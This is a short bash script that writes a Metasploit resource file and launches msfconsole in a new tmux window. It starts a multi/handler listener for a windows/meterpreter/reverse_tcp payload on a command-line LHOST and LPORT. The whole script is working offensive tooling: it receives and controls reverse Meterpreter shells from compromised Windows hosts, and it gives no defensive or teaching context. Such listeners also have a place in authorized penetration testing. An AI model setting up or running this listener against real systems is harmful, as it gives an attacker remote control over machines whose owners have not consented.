#!/bin/bash
# Dependencies: msfconsole, tmux
# Inputs: LHOST, LPORT

LHOST="$1"
LPORT="$2"

# Create Metasploit Resource Script
MSF_RC="/tmp/meterpreter_listener.rc"
cat << EOF > "$MSF_RC"
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit -j -z
EOF

# Create a new tmux window for the Meterpreter listener
tmux new-window -n Meterpreter "msfconsole -q -r $MSF_RC"
